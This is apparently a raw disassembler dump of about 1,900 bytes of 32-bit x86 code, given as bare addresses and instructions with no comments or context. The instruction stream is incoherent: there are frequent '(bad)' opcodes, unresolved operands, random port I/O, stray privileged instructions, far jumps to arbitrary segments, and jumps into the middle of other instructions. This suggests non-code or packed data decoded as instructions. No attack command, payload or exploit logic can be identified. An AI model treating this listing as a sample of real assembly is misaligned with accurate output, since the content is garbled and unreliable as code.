  445491:	mov    ecx,0x980cbac1
  445496:	mov    eax,ds:0x3380d215
  44549b:	es in  al,0x2
  44549e:	idiv   DWORD PTR ss:[eax]
  4454a1:	pusha  
  4454a2:	xchg   BYTE PTR [esi+0x654332d5],cl
  4454a8:	sahf   
  4454a9:	cwde   
  4454aa:	jnp    0x4454f9
  4454ac:	jg     0x4454b0
  4454ae:	shl    DWORD PTR [edi],0xb2
  4454b1:	aad    0xfd
  4454b3:	aad    0xe3
  4454b5:	jmp    0x1ae06b51
  4454ba:	ja     0x44550c
  4454bc:	stc    
  4454bd:	pop    ds
  4454be:	out    dx,eax
  4454bf:	jge    0x4454b9
  4454c1:	sti    
  4454c2:	add    bx,WORD PTR [edx-0x1b3c6c7a]
  4454c9:	add    bh,BYTE PTR [ecx-0x1fcf90f]
  4454cf:	sub    BYTE PTR [ecx-0x52],dl
  4454d2:	dec    edx
  4454d3:	and    BYTE PTR [ebx+esi*1],dl
  4454d6:	mov    ?,ebp
  4454d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4454d9:	add    eax,0xee4cdd24
  4454de:	ja     0x4454eb
  4454e0:	inc    esp
  4454e1:	add    ebp,DWORD PTR [edi+edi*4-0x5380a5be]
  4454e8:	gs scas al,BYTE PTR es:[edi]
  4454ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4454eb:	lahf   
  4454ec:	xor    eax,0xe256134
  4454f1:	mov    edx,0x4711eafc
  4454f6:	xchg   ebx,eax
  4454f7:	test   DWORD PTR [eax-0x1628da0f],esi
  4454fd:	inc    ebx
  4454fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4454ff:	xor    BYTE PTR [ebx+0x13],ah
  445502:	jnp    0x44552b
  445504:	rcr    ch,1
  445506:	packssdw mm6,mm6
  445509:	add    DWORD PTR [ebx],esi
  44550b:	cmp    eax,0x14a1ad3f
  445510:	dec    edi
  445511:	mov    ecx,0xe2e4ce1a
  445516:	(bad)  
  445518:	in     al,0x6b
  44551a:	pop    edx
  44551b:	jnp    0x445579
  44551d:	das    
  44551e:	dec    eax
  44551f:	mov    bl,0x89
  445521:	pop    es
  445522:	add    DWORD PTR [bx+0x59],ecx
  445526:	mov    dh,0x70
  445528:	push   0x262e8802
  44552d:	adc    eax,0x97548963
  445532:	ins    DWORD PTR es:[edi],dx
  445533:	and    edi,esp
  445535:	jge    0x4454e4
  445537:	outs   dx,BYTE PTR ds:[esi]
  445538:	push   0xc9f4a887
  44553d:	add    ah,dl
  44553f:	test   eax,0x8101f3c
  445544:	(bad)  
  445545:	outs   dx,DWORD PTR ds:[esi]
  445546:	jl     0x445545
  445548:	loop   0x44558c
  44554a:	call   0x3bd5:0xe85a34c6
  445551:	jg     0x445514
  445553:	sub    ecx,edi
  445555:	popf   
  445556:	add    al,0xdb
  445558:	push   0xf45b6985
  44555d:	push   ecx
  44555e:	mov    edi,DWORD PTR [edx-0x78]
  445561:	jle    0x4455ab
  445563:	and    al,0x40
  445565:	or     ebp,DWORD PTR [eax-0x2b]
  445568:	jg     0x4455d6
  44556a:	mov    ebp,DWORD PTR [ebp-0x4e1544f6]
  445570:	mov    ebx,ecx
  445572:	iret   
  445573:	mov    ds:0x70ff7df5,al
  445578:	jbe    0x44559f
  44557a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44557b:	inc    ecx
  44557c:	mov    ebp,0x29949f61
  445581:	push   edx
  445582:	sbb    DWORD PTR [eax-0x4f],edi
  445585:	jge    0x4455ff
  445587:	lods   eax,DWORD PTR ds:[esi]
  445588:	or     edi,ecx
  44558a:	mov    cl,0x3c
  44558c:	adc    eax,0x3a451c5b
  445591:	push   ebp
  445592:	mov    edx,0xc36d08da
  445597:	or     al,0x7
  445599:	xor    eax,0xc46c831e
  44559e:	ins    BYTE PTR es:[edi],dx
  44559f:	call   0x59bf:0xd49f0322
  4455a6:	adc    BYTE PTR [eax-0x1e],bl
  4455a9:	cs jbe 0x4455f7
  4455ac:	ja     0x4455b6
  4455ae:	outs   dx,BYTE PTR ds:[esi]
  4455af:	push   ecx
  4455b0:	aaa    
  4455b1:	cmp    ah,BYTE PTR [ecx]
  4455b3:	shr    BYTE PTR [ecx-0x40bed02f],0x2
  4455ba:	push   edx
  4455bb:	leave  
  4455bc:	les    edi,FWORD PTR [ecx]
  4455be:	mov    ds:0x1f2640df,al
  4455c3:	retf   
  4455c4:	push   es
  4455c5:	pop    esp
  4455c6:	lds    ecx,FWORD PTR [edx]
  4455c8:	xchg   BYTE PTR [ebx],al
  4455ca:	and    al,0x95
  4455cc:	loop   0x445608
  4455ce:	scas   al,BYTE PTR es:[edi]
  4455cf:	rcr    BYTE PTR [eax-0x6e],cl
  4455d2:	dec    esi
  4455d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4455d4:	or     DWORD PTR [edi+0x4e],ebp
  4455d7:	iret   
  4455d8:	mov    BYTE PTR [ebx],cl
  4455da:	add    dl,al
  4455dc:	mov    esi,0xbbaff3ee
  4455e1:	add    eax,0x407d3604
  4455e6:	loop   0x445602
  4455e8:	sbb    DWORD PTR [edi],eax
  4455ea:	add    BYTE PTR [edi],dh
  4455ec:	mov    BYTE PTR [ecx+0x3a],al
  4455ef:	xchg   esp,eax
  4455f0:	xchg   esi,eax
  4455f1:	rcr    BYTE PTR [ebp+ebx*2+0x44],0x3
  4455f6:	mov    edx,0x5eea411b
  4455fb:	lods   al,BYTE PTR ds:[esi]
  4455fc:	les    ebx,FWORD PTR [ebx]
  4455fe:	pop    ecx
  4455ff:	hlt    
  445600:	mov    dh,0x1e
  445602:	scas   al,BYTE PTR es:[edi]
  445603:	popa   
  445604:	adc    al,0x35
  445606:	adc    BYTE PTR [ecx+0x23],dl
  445609:	cmp    BYTE PTR [edx],0x3f
  44560c:	mov    al,ds:0x7d311a05
  445611:	sti    
  445612:	sub    dl,BYTE PTR [ecx+0x21]
  445615:	out    0x60,al
  445617:	adc    ecx,DWORD PTR [edi]
  445619:	rol    BYTE PTR ds:0xcd4ff2dc,0xd5
  445620:	pop    esi
  445621:	inc    edx
  445622:	(bad)  
  445624:	or     al,0x22
  445626:	scas   al,BYTE PTR es:[edi]
  445627:	inc    edi
  445628:	mov    DWORD PTR [edi-0x39],eax
  44562b:	test   DWORD PTR [edi+0x6f67a66d],0xe4052403
  445635:	cld    
  445636:	push   ebx
  445637:	push   edi
  445638:	cmp    al,0xdb
  44563a:	imul   DWORD PTR cs:[esi]
  44563d:	iret   
  44563e:	jae    0x445671
  445640:	add    BYTE PTR [esi],ch
  445642:	(bad)  
  445643:	cmp    ecx,DWORD PTR [edx+0x47156f01]
  445649:	je     0x445619
  44564b:	ret    0x1485
  44564e:	dec    edx
  44564f:	lock inc eax
  445651:	sub    ch,BYTE PTR [ecx]
  445653:	jp     0x4455dd
  445655:	clc    
  445656:	clc    
  445657:	test   eax,0xf15ae45e
  44565c:	cmp    BYTE PTR [ebx-0xdeb3ea0],al
  445662:	sar    BYTE PTR [ebp+ebx*4+0x5],cl
  445666:	mov    esi,0xddda9e
  44566b:	jo     0x445660
  44566d:	rcr    BYTE PTR [ecx-0x16fcb6d9],1
  445673:	outs   dx,DWORD PTR ds:[esi]
  445674:	sub    esi,esi
  445676:	shl    ch,1
  445678:	mov    al,0x5
  44567a:	inc    edx
  44567b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44567c:	push   eax
  44567d:	jmp    FWORD PTR [edi+ecx*1-0x5ce0b9ec]
  445684:	jo     0x445612
  445686:	inc    edx
  445687:	add    BYTE PTR [bp+si+0x2c],0xbb
  44568c:	fisub  WORD PTR [edx+0x6a]
  44568f:	pushf  
  445690:	or     esp,ebp
  445692:	outs   dx,DWORD PTR ds:[esi]
  445693:	and    edi,DWORD PTR [edi]
  445695:	ss adc edi,edi
  445698:	mov    ch,ch
  44569a:	mov    ds:0xfb327a92,al
  44569f:	mov    edi,0x9f27f1e6
  4456a4:	outs   dx,DWORD PTR ds:[esi]
  4456a5:	or     al,0xbf
  4456a7:	aam    0xc9
  4456a9:	mov    esp,0x10c41e66
  4456ae:	push   ds
  4456af:	popf   
  4456b0:	sar    BYTE PTR [esi-0x57],cl
  4456b3:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4456b5:	leave  
  4456b6:	mov    ebp,edx
  4456b8:	adc    dl,BYTE PTR [ebx-0x4b]
  4456bb:	mov    bl,0xe1
  4456bd:	scas   al,BYTE PTR es:[edi]
  4456be:	push   0x4b8b8970
  4456c3:	repnz rcl edi,0xa9
  4456c7:	xchg   edx,eax
  4456c8:	ins    BYTE PTR es:[edi],dx
  4456c9:	out    dx,eax
  4456ca:	or     dh,BYTE PTR [eax+ebp*8+0x2]
  4456ce:	hlt    
  4456cf:	pop    ebp
  4456d0:	cwde   
  4456d1:	out    0xe1,al
  4456d3:	nop
  4456d4:	sbb    bh,BYTE PTR [edx+0x3251d9d]
  4456da:	or     al,0x41
  4456dc:	or     esi,DWORD PTR [edx+0x1fbf181a]
  4456e2:	mov    dh,0x7f
  4456e4:	xchg   edi,eax
  4456e5:	int3   
  4456e6:	jecxz  0x445753
  4456e8:	fldenv [edx+esi*8]
  4456eb:	(bad)  
  4456ec:	popa   
  4456ed:	pop    es
  4456ee:	pop    ds
  4456ef:	(bad)  
  4456f0:	int3   
  4456f1:	hlt    
  4456f2:	add    bl,cl
  4456f4:	push   cs
  4456f5:	xchg   edi,eax
  4456f6:	cmp    dl,ah
  4456f8:	arpl   WORD PTR [ecx],dx
  4456fa:	add    eax,ecx
  4456fc:	inc    bl
  4456fe:	in     eax,dx
  4456ff:	adc    al,0xb6
  445701:	iret   
  445702:	(bad)  
  445703:	ror    DWORD PTR [eax+0x6caac042],cl
  445709:	stc    
  44570a:	icebp  
  44570b:	xlat   BYTE PTR ds:[ebx]
  44570c:	add    eax,0xb8ab3887
  445711:	repnz lahf 
  445713:	adc    bl,BYTE PTR [ecx]
  445715:	lods   eax,DWORD PTR ds:[esi]
  445716:	mov    dh,0x8b
  445718:	cld    
  445719:	mov    eax,ds:0x4d60d439
  44571e:	stos   BYTE PTR es:[edi],al
  44571f:	cld    
  445720:	jmp    0x445783
  445722:	pop    sp
  445724:	test   BYTE PTR [ebp+0x268155e],bh
  44572a:	sub    al,0xbd
  44572c:	enter  0xa63b,0xba
  445730:	cmc    
  445731:	push   ebx
  445732:	and    edx,edi
  445734:	(bad)  
  445735:	push   esp
  445736:	adc    al,0x5e
  445738:	inc    edi
  445739:	cwde   
  44573a:	out    dx,eax
  44573b:	rep lods eax,DWORD PTR ds:[esi]
  44573d:	add    ah,BYTE PTR [eax]
  44573f:	popf   
  445740:	pop    ecx
  445741:	loope  0x445792
  445743:	hlt    
  445744:	xor    DWORD PTR [esi+ebx*2-0x60bc8c9b],0xffffffd6
  44574c:	fwait
  44574d:	push   ecx
  44574e:	in     eax,0xc7
  445750:	cmp    eax,0xfe713003
  445755:	dec    esi
  445756:	xchg   ebx,eax
  445757:	and    eax,0xb1f71d7
  44575c:	shl    BYTE PTR [ebp+edi*2-0x4b],1
  445760:	mov    al,BYTE PTR [ecx-0x6d6b5136]
  445766:	cmp    eax,0x1f654483
  44576b:	jecxz  0x445706
  44576d:	ins    BYTE PTR es:[edi],dx
  44576e:	push   ecx
  44576f:	sbb    eax,0xa7fc05b3
  445774:	jno    0x44574b
  445776:	add    BYTE PTR [eax],0xad
  445779:	test   eax,0x24a4d11f
  44577e:	into   
  44577f:	jno    0x4457dd
  445781:	jp     0x445737
  445783:	clc    
  445784:	sub    DWORD PTR [edx],eax
  445786:	mov    ?,WORD PTR [ebx-0x3b]
  445789:	adc    dl,0xc4
  44578c:	je     0x44577a
  44578e:	fbstp  TBYTE PTR [edi-0x33]
  445791:	test   BYTE PTR [edi-0x73],cl
  445794:	push   ecx
  445795:	add    ecx,DWORD PTR [edx-0x2d]
  445798:	in     eax,0x34
  44579a:	in     eax,dx
  44579b:	or     cl,BYTE PTR [edx]
  44579d:	arpl   WORD PTR [eax-0x4f],sp
  4457a0:	pop    edi
  4457a1:	and    bl,BYTE PTR [esi+0x25]
  4457a4:	std    
  4457a5:	sub    ch,BYTE PTR [esi]
  4457a7:	not    esi
  4457a9:	and    al,0x42
  4457ab:	je     0x4457fd
  4457ad:	jae    0x44574e
  4457af:	xor    esp,ecx
  4457b1:	(bad)  
  4457b2:	out    0xb7,al
  4457b4:	mov    edi,ecx
  4457b6:	adc    eax,0x2c6071a7
  4457bb:	test   eax,0x54524507
  4457c0:	mov    BYTE PTR [ebx-0x78686ccb],0xdc
  4457c7:	push   esp
  4457c8:	ja     0x4457ad
  4457ca:	or     DWORD PTR [edi-0x37],0xffffffa6
  4457ce:	push   eax
  4457cf:	pop    ebp
  4457d0:	jbe    0x445806
  4457d2:	jg     0x445818
  4457d4:	mov    dh,0x87
  4457d6:	xor    edx,DWORD PTR [esi+edx*1]
  4457d9:	sbb    esp,DWORD PTR [ebp+edx*4+0x196cac39]
  4457e0:	mov    DWORD PTR [edx],eax
  4457e2:	int3   
  4457e3:	rcr    edi,1
  4457e5:	popa   
  4457e6:	dec    edi
  4457e7:	push   edx
  4457e8:	rcl    esp,0x1f
  4457eb:	mov    ebx,0x118c73c
  4457f0:	loop   0x4457c1
  4457f2:	js     0x445797
  4457f4:	mov    bh,0x53
  4457f6:	test   eax,0x44768202
  4457fb:	push   esp
  4457fc:	mov    cl,0x36
  4457fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4457ff:	dec    BYTE PTR [eax+0x44c57c3]
  445805:	push   edi
  445806:	push   ecx
  445807:	push   ebx
  445808:	loopne 0x445801
  44580a:	icebp  
  44580b:	aad    0x9a
  44580d:	(bad)  
  44580e:	mov    eax,0x8e4d003e
  445813:	dec    edx
  445814:	popf   
  445815:	jns    0x445812
  445817:	inc    ebp
  445818:	(bad)  
  445819:	mov    ch,0x66
  44581b:	dec    edi
  44581c:	add    al,0x90
  44581e:	xor    al,0x17
  445820:	mov    eax,es:0x19eed71b
  445826:	imul   esp,DWORD PTR [edi+0x140b061d],0xffffff89
  44582d:	out    0xf2,eax
  44582f:	jmp    FWORD PTR [ebx-0x300cb740]
  445835:	add    eax,0x4304aa06
  44583a:	inc    esp
  44583b:	in     eax,dx
  44583c:	sub    DWORD PTR [ebx+0x1f],0xffffffcb
  445840:	jb     0x44587b
  445842:	(bad)  
  445843:	out    0x44,eax
  445845:	add    al,0x6
  445847:	xchg   ebp,eax
  445848:	mov    ah,0xe4
  44584a:	sbb    al,0xd4
  44584c:	ja     0x16982a62
  445852:	arpl   WORD PTR [ebx],si
  445854:	fdivr  QWORD PTR [edx-0x7d3ea580]
  44585a:	push   esp
  44585b:	and    dl,al
  44585d:	mov    DWORD PTR ds:0x314289fb,ecx
  445863:	iret   
  445864:	or     BYTE PTR [ebx-0x2],bl
  445867:	ret    
  445868:	mov    BYTE PTR [ebp-0x213dcce2],bl
  44586e:	jle    0x44585a
  445870:	clc    
  445871:	shr    DWORD PTR [edx+0x758a36ab],1
  445877:	sbb    al,BYTE PTR [esi-0x50]
  44587a:	pusha  
  44587b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44587c:	les    esi,FWORD PTR [edi-0x647038fc]
  445882:	xor    ah,BYTE PTR [esi-0x2a86dccf]
  445888:	ins    BYTE PTR es:[edi],dx
  445889:	sbb    ah,BYTE PTR [ebp-0x21acd2c]
  44588f:	adc    ecx,ecx
  445891:	out    0x45,al
  445893:	mov    DWORD PTR [eax-0xb1a1e73],ecx
  445899:	sub    BYTE PTR [edi+ecx*4],0x2e
  44589d:	adc    eax,0x32676736
  4458a2:	fdiv   QWORD PTR ds:0x1327b69c
  4458a8:	mov    DWORD PTR [ebp-0x41f19769],eax
  4458ae:	retf   0x354f
  4458b1:	adc    al,0xb4
  4458b3:	daa    
  4458b4:	nop
  4458b5:	cmp    DWORD PTR [ebp+0x28f0d757],ebx
  4458bb:	je     0x445871
  4458bd:	sub    DWORD PTR [edi+0x1e394504],edi
  4458c3:	imul   esi,edi,0x7833db22
  4458c9:	mov    al,ds:0x82ae41c
  4458ce:	sbb    esp,edx
  4458d0:	dec    BYTE PTR [eax+0x7cc241d5]
  4458d6:	ss stc 
  4458d8:	repz test DWORD PTR [ecx],0xc7b277d7
  4458df:	and    eax,0xd63972ea
  4458e4:	dec    edx
  4458e5:	jno    0x445868
  4458e7:	mov    ebp,0xfcc4c5f0
  4458ec:	rol    DWORD PTR [edx+0x1f],1
  4458ef:	sub    DWORD PTR [esi+0x7c],ebp
  4458f2:	push   0xdfdf5fb4
  4458f7:	pop    edi
  4458f8:	inc    edx
  4458f9:	dec    ecx
  4458fa:	sbb    eax,0xfc9749d1
  4458ff:	jno    0x445885
  445901:	in     al,0x71
  445903:	pop    ss
  445904:	sub    BYTE PTR [ebx+0x182594c],bh
  44590a:	out    0x4,al
  44590c:	(bad)  
  44590d:	xor    DWORD PTR [edx-0x2a],esp
  445910:	mov    ebx,0xf7eee8c5
  445915:	add    ah,ah
  445917:	stos   DWORD PTR es:[edi],eax
  445918:	or     al,0xa5
  44591a:	jmp    0x881c:0x80e12689
  445921:	gs mov dl,0x3d
  445924:	cs xor DWORD PTR es:[edi+eax*1+0x7efad002],ecx
  44592d:	or     dh,BYTE PTR [ebx]
  44592f:	dec    ebx
  445930:	xchg   BYTE PTR [eax+0x2],dh
  445933:	lahf   
  445934:	mov    BYTE PTR [edi+0x11],bh
  445937:	loope  0x445944
  445939:	lods   eax,DWORD PTR ds:[esi]
  44593a:	data16 ds add bl,BYTE PTR ds:[ebp+edi*1-0x1c]
  445941:	adc    DWORD PTR [ebp+0x7e],ebx
  445944:	add    ah,BYTE PTR [eax+ebx*4+0x23031275]
  44594b:	mov    edi,esp
  44594d:	es sbb esi,esp
  445950:	mov    ebx,0x86a0cd87
  445955:	dec    eax
  445956:	jge    0x4459ad
  445958:	jmp    0x4459ae
  44595a:	cdq    
  44595b:	xchg   ebp,eax
  44595c:	lods   al,BYTE PTR ds:[esi]
  44595d:	das    
  44595e:	(bad)  
  44595f:	fidiv  DWORD PTR [ebx+ebx*1+0x6d]
  445963:	dec    edi
  445964:	inc    eax
  445965:	ins    BYTE PTR es:[edi],dx
  445966:	sub    al,BYTE PTR [esi-0x17]
  445969:	dec    edx
  44596a:	test   eax,0x1a02db46
  44596f:	xor    BYTE PTR [ebx-0x15718079],0x60
  445976:	push   ds
  445977:	fst    DWORD PTR [ebp+0x7c]
  44597a:	pop    esi
  44597b:	out    0x5c,eax
  44597d:	and    bl,BYTE PTR [eax-0x2c]
  445980:	mov    al,0xb9
  445982:	xlat   BYTE PTR ds:[ebx]
  445983:	shr    DWORD PTR [edi+0x3a],0x52
  445987:	and    al,0x89
  445989:	test   BYTE PTR [bp+si-0x8],dl
  44598d:	pop    ss
  44598e:	jmp    0x4459c7
  445990:	dec    eax
  445991:	add    BYTE PTR [edx+0x11],ch
  445994:	repnz scas eax,DWORD PTR es:[edi]
  445996:	imul   ecx,DWORD PTR [esi-0x15752c83],0x16bfe18b
  4459a0:	mov    al,0x45
  4459a2:	into   
  4459a3:	ins    DWORD PTR es:[edi],dx
  4459a4:	or     cl,bh
  4459a6:	sbb    edx,edx
  4459a8:	loope  0x4459ad
  4459aa:	sbb    dl,ch
  4459ac:	shr    ch,1
  4459ae:	xor    BYTE PTR [edi-0x4c],bh
  4459b1:	inc    edi
  4459b2:	xor    DWORD PTR [edi+0x15],edx
  4459b5:	xor    BYTE PTR [esi],bl
  4459b7:	in     eax,dx
  4459b8:	stc    
  4459b9:	fmul   DWORD PTR [edi+0x6e]
  4459bc:	lods   al,BYTE PTR ds:[esi]
  4459bd:	fsubr  st,st(4)
  4459bf:	sar    esp,cl
  4459c1:	shl    ebp,1
  4459c3:	cmp    al,0x85
  4459c5:	jae    0x445955
  4459c7:	push   esi
  4459c8:	retf   0x1e50
  4459cb:	mov    ecx,0x8cab0cf5
  4459d0:	push   esp
  4459d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4459d2:	retf   0xd5d5
  4459d5:	into   
  4459d6:	mov    DWORD PTR [ecx-0x2f],eax
  4459d9:	cld    
  4459da:	aam    0x8e
  4459dc:	xchg   ebp,eax
  4459dd:	cmp    DWORD PTR [ebx+eiz*1-0x566d7d24],esi
  4459e4:	rol    BYTE PTR [edi+0xc],0xd7
  4459e8:	imul   ecx,DWORD PTR [ebx],0x5b
  4459eb:	jnp    0x4459ad
  4459ed:	call   0x1fd0bcc4
  4459f2:	mov    ds:0x61bfd2cd,eax
  4459f7:	push   esp
  4459f8:	out    dx,al
  4459f9:	sub    al,0x21
  4459fb:	mov    edx,0xc809ca3e
  445a00:	mov    eax,eax
  445a02:	pusha  
  445a03:	sub    ah,BYTE PTR [eax-0x2e]
  445a06:	push   ds
  445a07:	cli    
  445a08:	mov    DWORD PTR [ecx],esi
  445a0a:	mov    ebp,0xab287227
  445a0f:	rcr    DWORD PTR [edx+ecx*8],1
  445a12:	pop    ss
  445a13:	cmp    BYTE PTR [eax-0x3f7626e3],cl
  445a19:	test   al,0x91
  445a1b:	test   DWORD PTR [ecx+0x3cb2e3b7],ecx
  445a21:	jmp    0x2541ab8
  445a26:	shr    BYTE PTR [edi+0x2c],1
  445a29:	jmp    DWORD PTR [ecx+0x60d33ee8]
  445a2f:	leave  
  445a30:	ss in  al,dx
  445a32:	jg     0x4459ea
  445a34:	(bad)  
  445a35:	adc    bl,dl
  445a37:	lods   al,BYTE PTR ds:[esi]
  445a38:	jmp    FWORD PTR ds:0x36a9c83
  445a3e:	inc    ebp
  445a3f:	out    0xa1,al
  445a41:	clc    
  445a42:	pop    ds
  445a43:	lahf   
  445a44:	jb     0x445a58
  445a46:	pop    es
  445a47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445a48:	mov    ebp,0xe5de24a6
  445a4d:	add    eax,0x1d4e02ae
  445a52:	div    eax
  445a54:	mov    esi,0xba476104
  445a59:	push   esi
  445a5a:	(bad)  
  445a5b:	mov    eax,DWORD PTR [eax+0x8]
  445a5e:	sbb    BYTE PTR [ebp+0x3a4c02b1],dl
  445a64:	jle    0x445a19
  445a66:	cmp    eax,0x1f84ce61
  445a6b:	xchg   edi,eax
  445a6c:	test   BYTE PTR [eax+ebx*4-0xfa011e2],dl
  445a73:	aad    0x73
  445a75:	jmp    0x445a5f
  445a77:	fiadd  WORD PTR [edi]
  445a79:	stos   BYTE PTR es:[edi],al
  445a7a:	and    eax,0x754b890a
  445a7f:	(bad)  
  445a80:	sti    
  445a81:	pushf  
  445a82:	ds inc ebp
  445a84:	push   ebp
  445a85:	add    bl,BYTE PTR [edx-0x67]
  445a88:	dec    esi
  445a89:	mov    ds:0x447e405f,eax
  445a8e:	imul   edi,DWORD PTR [ecx-0x5fee0513],0x23115508
  445a98:	dec    ebx
  445a99:	add    esp,ecx
  445a9b:	push   0xda4efe56
  445aa0:	add    bl,ch
  445aa2:	in     al,0xd9
  445aa4:	mov    DWORD PTR [ebx-0x7fbba9ab],edi
  445aaa:	xor    bh,BYTE PTR [edi-0x5a63d65d]
  445ab0:	int3   
  445ab1:	data16 fmulp st(2),st
  445ab4:	std    
  445ab5:	xchg   ecx,eax
  445ab6:	leave  
  445ab7:	aas    
  445ab8:	mov    BYTE PTR ds:0x38f3cca8,dh
  445abe:	aaa    
  445abf:	pop    esp
  445ac0:	mov    gs,WORD PTR [eax+edx*4]
  445ac3:	mov    ds:0x9a657ab6,eax
  445ac8:	je     0x445aac
  445aca:	xchg   ebp,eax
  445acb:	dec    eax
  445acc:	bound  eax,QWORD PTR [ebx]
  445ace:	fldz   
  445ad0:	sub    al,ah
  445ad2:	arpl   WORD PTR [ecx],cx
  445ad4:	mov    ebp,DWORD PTR [esi]
  445ad6:	or     dl,ah
  445ad8:	mov    eax,ds:0x504fd282
  445add:	icebp  
  445ade:	xchg   ecx,eax
  445adf:	aad    0xba
  445ae1:	jge    0x445b3c
  445ae3:	cmp    ebx,ebp
  445ae5:	arpl   WORD PTR [ecx-0x67],sp
  445ae8:	cmp    BYTE PTR [eax-0x10],bl
  445aeb:	aam    0x6d
  445aed:	out    dx,al
  445aee:	xor    edx,ecx
  445af0:	int    0xe6
  445af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445af3:	pop    ebx
  445af4:	loopne 0x445b1a
  445af6:	pop    ds
  445af7:	(bad)  
  445af9:	rcl    BYTE PTR es:[edi+0x2b607676],0x70
  445b01:	sub    ebp,edi
  445b03:	addr16 push 0xffffffe2
  445b06:	out    0x6a,eax
  445b08:	mov    edi,0x612db205
  445b0d:	pusha  
  445b0e:	iret   
  445b0f:	lods   eax,DWORD PTR ds:[esi]
  445b10:	dec    eax
  445b11:	inc    edx
  445b12:	pop    ebp
  445b13:	mov    cl,0x7
  445b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445b16:	lahf   
  445b17:	stos   BYTE PTR es:[edi],al
  445b18:	in     al,0x4b
  445b1a:	(bad)
  445b1e:	shr    BYTE PTR [edi-0x62631488],cl
  445b24:	xchg   DWORD PTR [ebx-0x2ea23e96],eax
  445b2a:	aas    
  445b2b:	fsub   st(4),st
  445b2d:	loope  0x445b19
  445b2f:	aad    0x47
  445b31:	fwait
  445b32:	push   esp
  445b33:	jecxz  0x445b45
  445b35:	retf   
  445b36:	nop
  445b37:	outs   dx,BYTE PTR ds:[esi]
  445b38:	mov    DWORD PTR [edi],edx
  445b3a:	shr    DWORD PTR [eax+0x5bfd6379],0x13
  445b41:	add    bh,BYTE PTR [eax+0x48]
  445b44:	test   al,0xc2
  445b46:	ja     0x445ae0
  445b48:	pop    esp
  445b49:	in     al,0x5b
  445b4b:	jnp    0x445b86
  445b4d:	mov    ch,0x9f
  445b4f:	xchg   esp,eax
  445b50:	pop    esi
  445b51:	ror    DWORD PTR [ecx+0x401f9bf8],0x8d
  445b58:	mov    ebx,0xf93843da
  445b5d:	lods   al,BYTE PTR ds:[esi]
  445b5e:	jg     0x445baf
  445b60:	mov    DWORD PTR [ebp+0x295299c3],ebx
  445b66:	fst    DWORD PTR [edx]
  445b68:	stos   DWORD PTR es:[edi],eax
  445b69:	ficom  DWORD PTR [eax+0x62dad75e]
  445b6f:	mov    cl,0xa0
  445b71:	test   eax,0xa88c09c2
  445b76:	aam    0x1c
  445b78:	jo     0x445b71
  445b7a:	pop    ds
  445b7b:	scas   eax,DWORD PTR es:[edi]
  445b7c:	clc    
  445b7d:	mov    dl,0x11
  445b7f:	lods   eax,DWORD PTR ds:[esi]
  445b80:	test   eax,0xbc1404de
  445b85:	jp     0x445b57
  445b87:	sbb    BYTE PTR [eax+0x45],0x1e
  445b8b:	inc    ecx
  445b8c:	and    DWORD PTR [ecx+0x46669425],0xffffff94
  445b93:	aam    0x55
  445b95:	mov    esp,0xb1912508
  445b9a:	ja     0x445bfa
  445b9c:	xchg   ebp,eax
  445b9d:	popa   
  445b9e:	sub    al,BYTE PTR [edi]
  445ba0:	ja     0x445bc7
  445ba2:	js     0x445b8f
  445ba4:	pop    edx
  445ba5:	test   dh,al
  445ba7:	loop   0x445bdb
  445ba9:	inc    edx
  445baa:	loope  0x445b9f
  445bac:	push   0x2
  445bae:	ret    0xebe8
  445bb1:	(bad)  
  445bb4:	pop    es
  445bb5:	jo     0x445c10
  445bb7:	mov    bh,0x1
  445bb9:	mov    eax,ds:0x920e28e0
  445bbe:	mov    al,0x32
  445bc0:	pop    ss
  445bc1:	push   ds
  445bc2:	mov    edx,0x19b476
  445bc7:	pop    ecx
  445bc8:	or     BYTE PTR [esi],al
  445bca:	adc    al,0xd8
  445bcc:	mov    BYTE PTR [ecx],ah
  445bce:	in     eax,0xb6
  445bd0:	mov    ebx,0x3574cb7e
  445bd5:	add    ebx,edx
  445bd7:	add    DWORD PTR [ebx],ecx
  445bd9:	mov    WORD PTR [ecx-0x7c],?
  445bdc:	fs out 0x91,al
  445bdf:	pop    es
  445be0:	push   es
  445be1:	cmp    eax,0x8589bdca
  445be6:	push   ecx
  445be7:	loop   0x445c63
  445be9:	or     BYTE PTR [ebp+edx*8+0x24a36bce],cl
  445bf0:	sub    edi,esp
  445bf2:	or     al,0xec
  445bf4:	mov    BYTE PTR [ecx+0xc],bl
  445bf7:	mov    al,ds:0x2ea12712
  445bfc:	inc    eax
  445bfd:	sbb    eax,0x4f4d7e60
  445c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445c03:	cmp    cl,BYTE PTR [ecx+0x4f]
  445c06:	lock adc eax,0x3f98a98e
  445c0c:	(bad)  
  445c0d:	fst    st(1)
  445c0f:	jne    0x445c2d
  445c11:	stc    
  445c12:	test   ch,dl
  445c14:	je     0x445c48
  445c16:	jmp    0x88a9:0x811ff848
  445c1d:	pop    ds
  445c1e:	jmp    0xd58e:0x2ce954d9
  445c25:	jno    0x445c15
  445c27:	cwde   
  445c28:	lea    edx,[edx]
  445c2a:	mov    ebx,DWORD PTR [ebp-0x20]
  445c2d:	sbb    bh,0xa
  445c30:	cmp    al,0xee
  445c32:	pop    ds
  445c33:	repz sub eax,0xc8e41bc0
  445c39:	mov    bl,BYTE PTR [esp+edx*8+0x2605c4e5]
  445c40:	daa    
  445c41:	sub    ebx,esp
  445c43:	pop    esi
  445c44:	mov    DWORD PTR ds:0xf39c09bd,edi
  445c4a:	stos   BYTE PTR es:[edi],al
  445c4b:	sub    al,0xd7
  445c4d:	push   es
  445c4e:	pop    esp
  445c4f:	int    0xef
  445c51:	add    bh,BYTE PTR [esp+ebx*2-0x6b]
  445c55:	(bad)  
  445c56:	fsubr  st(2),st
  445c58:	mov    esp,0xee3360a7
